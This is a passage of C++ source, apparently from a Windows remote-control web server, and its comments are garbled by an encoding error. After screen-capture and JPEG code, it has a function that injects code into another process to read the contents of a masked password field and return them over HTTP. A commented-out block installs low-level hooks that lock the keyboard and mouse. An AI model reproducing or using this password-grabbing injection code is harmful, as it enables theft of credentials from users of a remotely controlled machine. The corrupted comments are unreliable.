				float fY=(float)bih.biHeight/h;
				LPBYTE ptr,ptrS,ptrD=lpbuffer;
				for(int i=0;i<h;i++)
				{
					ptr=ptrD;
					for(int j=0;j<w;j++)
					{
						//�����������ԭͼ���е�����
						x=(long)(fX*j); y=(long)(fY*i);
						ptrS = lpbuffer + y * lEffwidth_src + x * 3;
						*ptr++=*ptrS;
						*ptr++=*(ptrS+1);
						*ptr++=*(ptrS+2);
					}
					ptrD+=lEffwidth_dst;
				}
				bih.biWidth=w; bih.biHeight=h;
				bih.biSizeImage=lEffwidth_dst*h;
			}//?if(w<bih.biWidth && h<bih.biHeight)
		}//?if(w!=0 && h!=0)
		//����jpegѹ��
		dwret=cImageF::IPF_EncodeJPEG(&bih,lpbuffer,lpbuffer,quality);
		lpbits=lpbuffer;	
	}//?if(::GetDIBits(hWndDC,

	::SelectObject(hMemDC, hOldBmp);
	::DeleteObject(hMemBmp);
	::DeleteDC(hMemDC);
	::ReleaseDC(hWnd, hWndDC);
	return dwret;
}

//------------------��ȡָ�����봰�ڵ�����--------------------------------
#include "cInjectDll.h"
typedef HWND (WINAPI *PWindowFromPoint)(POINT);
typedef long (WINAPI *PGetWindowLong)(HWND,int);
typedef BOOL (WINAPI *PPostMessage)(HWND,UINT,WPARAM,LPARAM);
typedef int  (WINAPI *PGetWindowText)(HWND,LPTSTR,int);
typedef struct _TGETPSWDINFO
{
	POINT pt; //��굱ǰ�����
	PWindowFromPoint pfnWindowFromPoint;
	PGetWindowLong pfnGetWindowLong;
	PGetWindowText pfnGetWindowText;
	char retPswdBuf[64];
}TGETPSWDINFO;
DWORD WINAPI GetPswdFromWind(INJECTLIBINFO *pInfo)
{
	TGETPSWDINFO *p=(TGETPSWDINFO *)&pInfo->dwParam;
	
	if(p==NULL || p->pfnWindowFromPoint==NULL)
		pInfo->dwReturnValue=3;
	else{
		HWND hWnd=(*p->pfnWindowFromPoint)(p->pt);
		if(hWnd==NULL) pInfo->dwReturnValue=2;
		else{
			long l=(*p->pfnGetWindowLong)(hWnd,GWL_STYLE);
			if((l&ES_PASSWORD)==0) pInfo->dwReturnValue=1; //��PASSWOD ����
			l=(*p->pfnGetWindowText)(hWnd,p->retPswdBuf,sizeof(p->retPswdBuf)-1);
			p->retPswdBuf[l]=0;
		}
	}
	return 0;
}
//��ȡ���봰�ڵ�����
bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	RECT rc; TGETPSWDINFO info;
	rc.left=rc.top=0; info.pt.x=info.pt.y=0;
	::memset((void *)&info,0,sizeof(TGETPSWDINFO));
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	if( (ptr=httpreq.Request("x")) ) info.pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) info.pt.y=atoi(ptr);
	info.pt.x+=rc.left; info.pt.y+=rc.top;
	
	DWORD dwret,pid=0;
	if( (hwnd=::WindowFromPoint(info.pt)) ) GetWindowThreadProcessId(hwnd,&pid);
	
	//��ʼ��ָ���ĺ���ָ��
	info.pfnGetWindowLong= (PGetWindowLong)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowLongA");	
	info.pfnGetWindowText= (PGetWindowText)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowTextA");
	info.pfnWindowFromPoint= (PWindowFromPoint)GetProcAddress(GetModuleHandle
						("User32.dll"),"WindowFromPoint");
	cInjectDll inject(NULL); //����0 �ɹ�
	dwret=inject.Call(pid,(PREMOTEFUNC)&GetPswdFromWind,(PVOID)&info,sizeof(TGETPSWDINFO));
	int buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<result>%d</result>\r\n"
				"<pid>%d</pid>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",dwret,pid,info.retPswdBuf);
	
	httprsp.NoCache();//CacheControl("No-cache");
	//����MIME���ͣ�Ĭ��ΪHTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//������Ӧ���ݳ���
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//-------------------------------����������------------------------------
/*--------------�������ã�������dll��ʽ��ȫ�ֹҹ�--------------------------
static HHOOK g_hKBLockHook=NULL;//����������깳�Ӿ��
static HHOOK g_hMSLockHook=NULL;

//һ�¶�����winuser.h�е����붨���� #if (_WIN32_WINNT >= 0x0400)
#ifndef LLMHF_INJECTED

#define WH_KEYBOARD_LL 13
#define WH_MOUSE_LL 14
// Structure used by WH_KEYBOARD_LL
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD   vkCode;
    DWORD   scanCode;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} KBDLLHOOKSTRUCT, FAR *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

// Structure used by WH_MOUSE_LL
typedef struct tagMSLLHOOKSTRUCT {
    POINT   pt;
    DWORD   mouseData;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} MSLLHOOKSTRUCT, FAR *LPMSLLHOOKSTRUCT, *PMSLLHOOKSTRUCT;

#endif

//����������괦����
LRESULT CALLBACK kbLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // 
)
{	
	KBDLLHOOKSTRUCT *p=(KBDLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hKBLockHook,nCode,wParam,lParam);
	}
	return 1;
}
//����������괦����
LRESULT CALLBACK msLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // mouse coordinates
)
{	
	MSLLHOOKSTRUCT *p=(MSLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hMSLockHook,nCode,wParam,lParam);
	}
	return 1;
}

//��װ��ж�ؼ�����깳��
bool SetMouseKeybHook(bool bInstall)
{
	if(bInstall) //��װ������깳��
	{
		if(g_hKBLockHook || g_hMSLockHook) return true; //�Ѿ���װ��
		HMODULE hmdl=GetModuleHandle(NULL);
		printf("aaaaaaaa hmdl=%d, GetLastError=%d \r\n",hmdl,GetLastError());
		g_hKBLockHook=::SetWindowsHookEx(WH_KEYBOARD_LL,kbLockProc,hmdl,0);
		printf("g_hKBLockHook =%d, GetLastError=%d \r\n",g_hKBLockHook,GetLastError());
		g_hMSLockHook=::SetWindowsHookEx(WH_MOUSE_LL,msLockProc,hmdl,0);
		printf("g_hMSLockHook =%d, GetLastError=%d \r\n",g_hMSLockHook,GetLastError());
		if(g_hKBLockHook && g_hMSLockHook) return true;
	}
	//ж����깳��
	if(g_hKBLockHook) UnhookWindowsHookEx(g_hKBLockHook);
	if(g_hMSLockHook) UnhookWindowsHookEx(g_hMSLockHook);
	g_hKBLockHook=NULL; g_hMSLockHook=NULL;
	return (bInstall)?false:true;
}
bool ifInstallMouseKeyHook() { return (g_hKBLockHook || g_hMSLockHook); }
*/